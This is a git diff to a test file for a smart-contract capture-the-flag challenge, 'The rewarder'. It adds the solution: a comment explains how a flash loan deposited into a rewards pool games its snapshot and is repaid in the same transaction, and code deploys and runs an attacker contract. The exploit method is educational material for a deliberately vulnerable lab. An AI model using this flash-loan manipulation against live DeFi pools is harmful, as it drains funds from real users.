@@ -66,6 +66,20 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+	/** We can loan all the balance in flashLoan contract and deposit that into the rewarder pool.
+         * Rewarder pool would take a snapshot of the deposite and will only check that record to issue rewards.
+         * We can withdraw the DVT right after depositing and return the loan in the same transaction
+         * while our issued accToken will remain in the record and that's how we can attack!
+         */
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const AttackerFactory = await ethers.getContractFactory('RewarderAttacker', attacker);
+        this.attackerContract = await AttackerFactory.deploy(
+            this.flashLoanPool.address, 
+            this.rewarderPool.address,
+            this.rewardToken.address,
+            this.liquidityToken.address);
+        await this.attackerContract.attack(attacker.address);
     });
 
     after(async function () {
@@ -98,3 +112,4 @@ describe('[Challenge] The rewarder', function () {
         expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
     });
 });
+
